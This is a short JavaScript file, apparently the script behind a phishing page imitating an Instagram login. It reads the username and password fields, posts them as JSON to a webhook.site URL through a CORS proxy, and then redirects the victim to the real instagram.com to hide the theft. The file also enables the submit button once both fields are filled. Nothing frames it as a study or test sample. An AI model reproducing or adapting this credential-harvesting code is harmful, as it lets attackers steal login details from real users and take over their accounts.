async function envoyerDonnees() {
  var user = document.getElementById('user').value;
  var password = document.getElementById('password').value;

  const payload = {
    user: user,
    password: password
  };

  await fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/1bc48b5e-7c2a-4d8e-9159-32da7324c54c', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  });
  setTimeout(()=>{window.location.href="https://instagram.com"}, 1000)
}

function actualiseBtn(){
    if (document.getElementById("user").value && document.getElementById("password").value){
        document.getElementById("valid").disabled=false
    } else {
        document.getElementById("valid").disabled=true
    }
}
